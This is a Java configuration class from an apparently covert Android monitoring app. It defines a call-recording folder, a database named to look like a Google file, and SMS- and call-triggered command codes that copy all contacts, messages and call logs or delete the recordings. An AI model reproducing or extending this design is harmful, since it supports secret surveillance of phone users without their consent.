package com.android.zouchongjin;

import android.os.Environment;

public class MyConfig {

	/** 通话录音文件的保存目录 */
	public static final String PATH_PHONEAUDIO = Environment.getExternalStorageDirectory() + "/zsound";
	/** 保存短信和定位信息的数据库名称 */
	public static final String DATABASE_NAME = "zgoogle.db";

	/** 删除录音文件夹（收到短信和拨打电话都会触发） */
	public static final String PHONE_DELETESOUND = "001";
	/** 把 所有联系人 都存到SQLite数据库 */
	public static final String PHONE_SAVEALL_LXR = "002";
	/** 把 所有短信 都存到SQLite数据库 */
	public static final String PHONE_SAVEALL_MESSAGE = "003";
	/** 把 所有通话记录 都存到SQLite数据库 */
	public static final String PHONE_SAVEALL_CALLRECORD = "004";

	public static final String PACKAGE_NAME = "com.android.zouchongjin";
	public static final String TAG = "zouchongjin";

}
